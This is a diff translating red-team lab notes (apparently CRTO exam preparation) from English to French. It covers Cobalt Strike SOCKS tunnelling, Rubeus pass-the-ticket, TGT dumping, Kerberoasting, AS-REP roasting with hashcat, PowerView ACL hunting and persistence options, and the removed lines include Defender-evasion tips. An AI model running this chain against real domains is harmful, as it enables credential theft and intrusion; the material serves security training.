@@ -145,77 +145,77 @@ Ajouter une règle :
 
 <img src="/images/Proxification-Rules-target-hosts-network-subnet-proxychains.png">  
 
-Click **OK** → **OK**.
+Cliquer sur **OK**, puis de nouveau sur **OK**.
 
-> **Why `/23`?** The CONTOSO lab environment spans `10.10.120.0/23` (covers `.120.x` and `.121.x` subnets). Adjust the CIDR to match the actual target range shown in your lab environment. Routing only the target subnet prevents all Attacker Desktop traffic from going through the beacon.
+> **Pourquoi `/23` ?** Le lab CONTOSO utilise ici `10.10.120.0/23`, qui couvre les réseaux `.120.x` et `.121.x`. Adapter le CIDR au périmètre réellement autorisé permet de limiter le trafic acheminé par le tunnel.
 
-> **Rule ordering matters:** Proxifier evaluates rules top-to-bottom. The default `Direct` rule must be below your `Beacon` rule, or it will short-circuit and traffic will go direct (failing to reach internal hosts).
+> **Ordre des règles :** Proxifier applique les règles de haut en bas. Placer la règle `Beacon` avant la règle `Direct` pour éviter que les connexions internes passent directement.
 
 ---
 
-## Phase 5 — LDAP Service Ticket
+## Demander un ticket de service LDAP
 
-> **Why two steps (runas + asktgs)?** Kerberos tickets are session-bound. To use rsteel's TGT, you need a logon session on the Attacker Desktop that is configured for the CONTOSO domain context. `runas /netonly` creates a new process with a Type 9 network logon session (credentials used only for network auth, not local). The password is irrelevant — you will immediately overwrite the Kerberos state by injecting the real TGT via `asktgs /ptt`.
+> **Pourquoi deux étapes ?** Les tickets Kerberos sont liés à une session de connexion. `runas /netonly` ouvre ici une session réseau de type 9 sur l’Attacker Desktop, tandis que Rubeus utilise le ticket Kerberos fourni dans cette session.
 
-### Step 1 — Create a CONTOSO Network Logon Session
+### Créer une session réseau CONTOSO
 
-In an existing Terminal window (does not need to be admin), run:
+Dans un terminal existant, exécuter la commande suivante sans nécessiter d’élévation :
 
 ```powershell
 runas /netonly /user:CONTOSO\rsteel powershell.exe
 ```
 
-When prompted for password, enter any string (e.g., `FakePass`). The password is not validated against the domain for `/netonly` sessions — the credential is stored for later network authentication challenges, but we will override it with a Kerberos ticket before making any network calls.
+Lors de la demande de mot de passe, saisir la valeur d’exemple du lab. Pour une session `/netonly`, cette valeur n’est pas immédiatement vérifiée auprès du domaine ; l’authentification réseau ultérieure utilise le contexte de la session et les tickets disponibles.
 
-> A new PowerShell window opens running as `CONTOSO\rsteel` network context. All subsequent Rubeus and RSAT commands run in **this new window**.
+> Une nouvelle fenêtre PowerShell s’ouvre avec le contexte réseau `CONTOSO\rsteel`. Exécuter les commandes Rubeus et RSAT suivantes **dans cette fenêtre**.
 
 ---
 
-### Step 2 — Request LDAP Service Ticket and Inject (PTT)
+### Demander et importer le ticket LDAP (Pass-the-Ticket)
 
-In the **new PowerShell window** (the runas one):
+Dans la nouvelle fenêtre PowerShell ouverte avec `runas` :
 
 ```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
 ```
 
-Replace `[ENCODED TGT]` with the full base64 blob saved in Phase 1.
+Remplacer `[ENCODED TGT]` par la valeur Base64 complète enregistrée au début du lab.
 
-> 1. Rubeus sends a `TGS-REQ` to `lon-dc-1` (through the SOCKS proxy via Proxifier) using rsteel's TGT.
-> 2. The DC validates the TGT, issues an LDAP service ticket (`TGS-REP`) for `ldap/lon-dc-1` encrypted with rsteel's session key.
-> 3. `/ptt` (Pass-the-Ticket) injects the resulting service ticket into the current logon session's Kerberos cache — no kirbi file written to disk.
+> 1. Rubeus envoie une requête `TGS-REQ` à `lon-dc-1` via Proxifier et le proxy SOCKS, en utilisant le TGT de `rsteel`.
+> 2. Le Domain Controller valide le TGT et délivre un ticket de service LDAP (`TGS-REP`) pour `ldap/lon-dc-1`.
+> 3. L’option `/ptt` importe le ticket obtenu dans le cache Kerberos de la session de connexion courante.
 >
-> **OPSEC note (attacker desktop):** Rubeus runs locally on the Attacker Desktop (your own controlled machine), not on a target. 
-> Defender on the Attacker Desktop may flag `Rubeus.exe` by name or by assembly signature. If Defender is active on the dev box:
-> - Rename `Rubeus.exe` to a neutral name (e.g., `svc_helper.exe`)
-> - Or add a Defender exclusion for `C:\Tools\` (already done in CRTO lab environment)
-> - In a real engagement, compile a custom Rubeus build with modified class/namespace names
+> **Note OPSEC :** Rubeus s’exécute ici sur l’Attacker Desktop du lab et non sur l’hôte cible. 
+> Microsoft Defender peut détecter l’exécutable Rubeus sur l’Attacker Desktop. Les notes d’origine évoquent plusieurs adaptations propres à l’environnement de formation :
+> - Renommer l’exécutable utilisé dans l’environnement de lab.
+> - Utiliser la configuration de sécurité autorisée et prévue pour les outils du lab.
+> - Conserver une configuration validée et documenter les résultats de détection.
 >
-> **Why not request the ticket from inside the beacon?**
-> Requesting the TGS from inside the beacon would place the ticket in the beacon's session on the **target** host. We need the ticket in a session on the **Attacker Desktop** so that RSAT cmdlets running locally can use it through the proxy. The `asktgs` approach places the ticket exactly where we need it.
+> **Pourquoi ne pas demander le ticket depuis le Beacon ?**
+> Une demande depuis le Beacon placerait le ticket dans la session du poste cible. Dans ce lab, les cmdlets RSAT tournent sur l’Attacker Desktop : le ticket doit donc être disponible dans sa session Kerberos.
 
 ---
 
-### Step 3 — Verify Ticket Injection
+### Vérifier l’import du ticket
 
-`klist` (native Windows command) will not show tickets in a `/netonly` session. Use Rubeus instead:
+Pour examiner les tickets dans le contexte `/netonly` utilisé ici, vérifier le résultat avec Rubeus :
 
 ```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
 ```
 
-> **Expected output:** Entry for `ldap/lon-dc-1 @ CONTOSO.COM` with a valid expiry time. If the ticket is missing, recheck:
-> - The base64 blob has no embedded newlines
-> - The `/dc:` flag points to a hostname that resolves (check Step 3 of Phase 3)
-> - Proxifier rule covers `10.10.120.0/23` and the DC IP is in that range
+> **Résultat attendu :** une entrée `ldap/lon-dc-1 @ CONTOSO.COM` avec une date d’expiration valide. Si elle manque, vérifier :
+> - La chaîne Base64 ne contient pas de retour à la ligne.
+> - L’argument `/dc:` utilise un nom d’hôte correctement résolu.
+> - La règle Proxifier couvre `10.10.120.0/23` et l’adresse du DC appartient bien à cette plage.
 
 ---
 
-## Phase 6 — Domain Enumeration via SOCKS
+## Énumération Active Directory via SOCKS
 
-> **Why RSAT cmdlets instead of SharpHound/BloodHound here?** This lab demonstrates that with a valid Kerberos ticket and a SOCKS proxy you can use **native, signed Microsoft binaries** (no tooling on disk in the target network) to enumerate AD. This is the stealthiest enumeration path — RSAT cmdlets generate standard LDAP queries indistinguishable from a legitimate admin's workstation.
+> **Pourquoi RSAT ?** Ce lab montre comment interroger Active Directory depuis l’Attacker Desktop avec les cmdlets Microsoft et une session Kerberos valide, en acheminant les connexions par SOCKS. Les requêtes LDAP restent observables côté domaine.
 
-Run the following in the **runas PowerShell window** (where the LDAP ticket is cached):
+Exécuter les commandes suivantes dans la **fenêtre PowerShell ouverte avec `runas`**, où le ticket LDAP est disponible :
 
 ```powershell
 # Enumerate all computer objects
@@ -228,9 +228,9 @@ Get-ADUser -Filter * -Server lon-dc-1
 Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
 ```
 
-`OPSEC-🟢SAFE` LDAP queries arrive at the DC from the beacon's host IP (tunnelled through the SOCKS proxy). The DC sees standard LDAP bind + query operations from what it believes is rsteel's workstation. No PowerShell.exe on a **target** host, no child process, no Sysmon events on targets.
+`OPSEC-🟢SAFE` dans les notes : les requêtes LDAP transitent par le proxy SOCKS et sont reçues par le Domain Controller. Elles peuvent être consignées et analysées par les mécanismes de journalisation du réseau.
 
-> **EXTRA exam ENUMERATION**
+> **Énumération complémentaire pour l’examen**
 > ```powershell
 > # SPNs (Kerberoast targets)
 > Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1
@@ -246,33 +246,33 @@ Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
 > Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
 > ```
 
-> **Lab complete.** You have demonstrated: BOF-based ticket extraction → SOCKS tunnel → Proxifier routing → Kerberos PTT → native LDAP enumeration. No raw LSASS read, no child processes on targets, no tooling dropped to disk on the target network.
+> **Fin du lab :** extraction d’un ticket avec un BOF, tunnel SOCKS, routage Proxifier, Pass-the-Ticket Kerberos et énumération LDAP depuis les outils locaux.
 
 ---
 
-## Troubleshooting — SOCKS Proxy Dead
+## Dépannage — proxy SOCKS indisponible
 
-> **Symptom:** Proxifier logs show `error: Could not connect through proxy 10.0.0.5:1080 - Reading proxy reply on a connection request timed out`. Previously working connections start failing mid-session.
+> **Symptôme :** les logs Proxifier affichent `error: Could not connect through proxy 10.0.0.5:1080 - Reading proxy reply on a connection request timed out`. Les connexions auparavant fonctionnelles échouent pendant la session.
 
-**Root cause:** The SOCKS listener runs inside the beacon thread. If the beacon stops calling home (dead, sleeping, or network disruption), the tunnel stalls and all proxy connections time out. The Proxifier side appears healthy — the failure is on the team server end.
+**Cause possible :** si le Beacon ne communique plus avec le team server, les connexions SOCKS peuvent expirer même lorsque Proxifier semble correctement configuré.
 
-### Step 1 — Diagnose: Beacon alive or dead?
+### Vérifier si le Beacon est encore actif
 
-Check the CS UI — look at the beacon's last callback timestamp.
+Dans Cobalt Strike, consulter l’heure du dernier callback du Beacon.
 
-- **Last callback recent (within sleep+jitter window)** → beacon alive, socks process dropped → restart it
-- **Last callback stale / beacon greyed out** → beacon dead → re-establish
+- **Callback récent** → le Beacon est actif ; vérifier le listener SOCKS.
+- **Callback ancien ou Beacon grisé** → le Beacon semble inactif ; vérifier la connectivité.
 
-### Step 2a — Beacon alive: Restart the SOCKS listener
+### Redémarrer le listener SOCKS si le Beacon est actif
 
 ```cs
 beacon> socks stop
 beacon> socks 1080 socks5
 ```
 
-Then re-test in Proxifier by re-running any RSAT command. Connection should succeed immediately.
+Tester ensuite la connexion depuis Proxifier avec une commande RSAT. Vérifier le résultat, sans présumer de la réussite.
 
-### Step 2b — Beacon dead: Re-establish via persistence
+### Beacon inactif — vérifier la reprise de session
 
 ```cs
 // Option 1 — COM hijack (Teams DLL) — triggers when Teams next starts on the target
@@ -280,11 +280,11 @@ Then re-test in Proxifier by re-running any RSAT command. Connection should succ
 // Option 3 — Re-run initial access vector (ngentask/AppDomainHijack) if no persistence deployed
 ```
 
-If the beacon was the only foothold and no persistence was pre-deployed, you must re-run the initial compromise vector before the SOCKS proxy can be restored.
+Si le Beacon était le seul point d’accès du lab, le tunnel ne peut pas fonctionner tant que la session n’est pas rétablie.
 
-### Prevention — Lower sleep before SOCKS-heavy work
+### Adapter l’intervalle sleep lors des tests SOCKS
 
-Heavy LDAP queries (BloodHound, mass RSAT enumeration) can stall a sleeping beacon because the proxy blocks waiting for beacon callback. Drop sleep to interactive before starting:
+Les requêtes LDAP volumineuses peuvent être ralenties par l’intervalle de communication du Beacon. Les notes présentent un réglage plus interactif pour ces tests.
 
 ```cs
 beacon> sleep 0          // interactive — constant callback, no sleep delay
@@ -292,20 +292,20 @@ beacon> sleep 0          // interactive — constant callback, no sleep delay
 beacon> sleep 3000 20    // restore: 3s sleep, 20% jitter
 ```
 
-> `OPSEC-🟠CAUTION` — `sleep 0` beacons continuously and is significantly noisier. Use only for the duration of the proxy task window, then restore immediately.
+> `OPSEC-🟠CAUTION` — `sleep 0` augmente la fréquence des callbacks et le volume de trafic. Le rétablissement du paramètre normal est nécessaire à la fin du test.
 
 
-Port `9389` is the AD Web Services port used by RSAT cmdlets (ADWS — alternative to port 389 LDAP). Timeouts on this port mean RSAT cmdlets are failing silently or hanging.
+Le port `9389` correspond à Active Directory Web Services (ADWS), utilisé par certaines cmdlets RSAT. Un timeout sur ce port peut bloquer ces commandes.
 
 ---
 
-## Post-Lab — Next Steps on Exam Day
+## Après le lab — vérifications pour l’examen
 
-> Once the SOCKS proxy is established and initial LDAP enumeration is complete, the following is the standard attack progression. Work top-to-bottom — each step informs the next.
+> Après la configuration SOCKS et la première énumération LDAP, cette section regroupe des contrôles complémentaires à effectuer selon le périmètre du lab.
 
-### 1. Dump live user TGTs from the foothold `OPSEC-🟢SAFE`
+### Vérifier les TGT actifs du poste initial `OPSEC-🟢SAFE`
 
-`krb_triage` will show every user currently logged into the compromised host. Any live TGT is a free lateral movement ticket — dump them before moving on.
+`krb_triage` permet de recenser les tickets des sessions accessibles depuis le contexte courant et d’identifier leur propriétaire.
 
 ```cs
 beacon> krb_triage                               // identify all live sessions
@@ -313,9 +313,9 @@ beacon> krb_dump /user:pchilds /service:krbtgt   // example: second user logged 
 beacon> krb_dump /user:<anyuser> /service:krbtgt
 ```
 
-Save every TGT blob. They expire in 10h — prioritise using them before rotating to other techniques.
+Noter les dates d’expiration des tickets, qui dépendent de la politique Kerberos du domaine.
 
-### 2. Enumerate group memberships `OPSEC-🟢SAFE`
+### Énumérer les appartenances aux groupes `OPSEC-🟢SAFE`
 
 ```powershell
 # In runas PowerShell window (LDAP ticket in session)
@@ -328,43 +328,43 @@ Get-ADGroupMember "Remote Desktop Users" -Server lon-dc-1
 Get-ADPrincipalGroupMembership <username> -Server lon-dc-1
 ```
 
-If any live TGT user (from step 1) is in a privileged group → immediate DA path via that ticket.
+Une appartenance à un groupe privilégié justifie une vérification des droits réellement accordés au compte.
 
-### 3. Confirm SPNs before Kerberoasting `OPSEC-🟢SAFE`
+### Vérifier les SPN des comptes de service `OPSEC-🟢SAFE`
 
-Never roast blind — enumerate SPNs first to avoid honeypot accounts and identify real targets.
+Énumérer les SPN et identifier les éventuels comptes leurres avant de sélectionner un compte dans le lab.
 
 ```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet -Server lon-dc-1 | Select SamAccountName,ServicePrincipalName,PasswordLastSet
 ```
 
-> If `oracle_svc` or `mssql_svc` return **no SPN** (Rubeus reports "No results returned by LDAP"), the accounts are not Kerberoastable via standard method. Pivot to AS-REP roasting check immediately.
+> Si `oracle_svc` ou `mssql_svc` ne présentent aucun SPN, la méthode Kerberoasting classique ne s’applique pas à ces comptes. Examiner séparément les propriétés de préauthentification Kerberos.
 
-### 4. Kerberoast targeted SPNs `OPSEC-🟠CAUTION`
+### Tester les SPN ciblés avec Kerberoasting `OPSEC-🟠CAUTION`
 
-Roast only confirmed targets — one account at a time:
+Dans le lab, utiliser uniquement les comptes autorisés et identifiés :
 
 ```cs
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:oracle_svc /nowrap
 ```
 
-Send hashes to Kali for offline cracking:
+Le bloc suivant présente l’analyse hors ligne des hashes dans l’environnement Kali :
 
 ```bash
 hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-### 5. AS-REP Roasting check `OPSEC-🟠CAUTION`
+### Vérifier les comptes concernés par AS-REP Roasting `OPSEC-🟠CAUTION`
 
-Run if Kerberoasting yields no SPNs, or as a parallel check:
+Examiner les paramètres de préauthentification lorsque cela fait partie du périmètre :
 
 ```powershell
 # Check flag directly via RSAT
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth -Server lon-dc-1
 ```
 
-If any hit:
+Si un compte correspond aux critères :
 
 ```cs
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<account> /format:hashcat /nowrap
@@ -374,9 +374,9 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproas
 hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-### 6. ADCS check — investigate Certificate Services hosts `OPSEC-🟢SAFE`
+### Identifier les serveurs Active Directory Certificate Services `OPSEC-🟢SAFE`
 
-Any host named `*-CS-*` or `*-CA-*` in the computer list is a high-priority ADCS target. Confirm via LDAP:
+Les machines dont le nom contient `-CS-` ou `-CA-` peuvent héberger des services ADCS ; vérifier leur rôle par LDAP.
 
 ```powershell
 Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Configuration,DC=contoso,DC=com" -Properties * -Server lon-dc-1 | Select Name,dNSHostName
@@ -385,20 +385,20 @@ Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Co
 Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com" -Filter * -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,Name -Server lon-dc-1 | Select Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag
 ```
 
-If ADCS confirmed → Certify.exe to find ESC1–ESC8 vulnerabilities is the next module path.
+Si ADCS est présent, poursuivre l’étude des configurations de certificats dans le module dédié.
 
-### 7. ACL enumeration — find delegation paths `OPSEC-🟠CAUTION`
+### Énumérer les ACL et les permissions de délégation `OPSEC-🟠CAUTION`
 
 ```cs
 beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 beacon> powerpick Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "rsteel|pchilds|dyork"} | Select ObjectDN,ActiveDirectoryRights,IdentityReferenceName
 ```
 
-Looking for: `WriteDACL`, `GenericWrite`, `GenericAll`, `ForceChangePassword`, `WriteOwner` on any user/computer/OU — these are direct DA paths without needing to crack a hash.
+Examiner les permissions `WriteDACL`, `GenericWrite`, `GenericAll`, `ForceChangePassword` et `WriteOwner` sur les objets AD. Leur impact dépend du contexte et des relations entre objets.
 
-### 8. Lateral movement — priority order
+### Lateral Movement — ordre des vérifications
 
-Once you have credentials or a usable ticket:
+Après validation d’un compte ou d’un ticket autorisé dans le lab :
 
 ```cs
 // Always impersonate first
